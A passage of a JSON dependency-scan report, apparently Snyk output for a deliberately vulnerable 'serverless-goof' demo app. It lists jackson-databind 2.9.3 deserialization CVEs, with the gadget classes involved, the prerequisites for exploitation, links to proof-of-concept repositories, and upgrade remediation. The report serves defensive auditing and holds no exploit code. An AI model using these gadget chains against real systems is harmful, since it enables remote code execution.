      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0, 2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T12:47:33.579319Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/3e8fa3beea49ea62109df9e643c9cb678dabdde1)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2997)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T12:44:41Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056414",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36187"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-07T16:40:33.972718Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33.970819Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/3e8fa3beea49ea62109df9e643c9cb678dabdde1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2997"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:02:15.197495Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2998)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-36184)\n",
      "disclosureTime": "2021-01-07T13:00:25Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056416",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36184"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-12T12:51:46.193012Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2998"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-36184"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:05:16.831143Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2997)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:00:26Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056417",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36186"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-07T16:40:34.208000Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34.206083Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2997"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:08:29.105792Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [Al1ex's Poc](https://github.com/Al1ex/CVE-2020-36179)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:05:51Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056418",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36180"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-02-09T15:25:00.471180Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34Z",
      "references": [
        {
          "title": "Al1ex's Poc",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:11:36.206859Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3003)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:10:25Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056419",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36183"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-07T16:40:34.630062Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34.627750Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3003"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:29:22.463416Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [Al1ex's Poc](https://github.com/Al1ex/CVE-2020-36179)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:12:59Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056420",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36179"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-12T15:12:08.032670Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34Z",
      "references": [
        {
          "title": "Al1ex's Poc",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
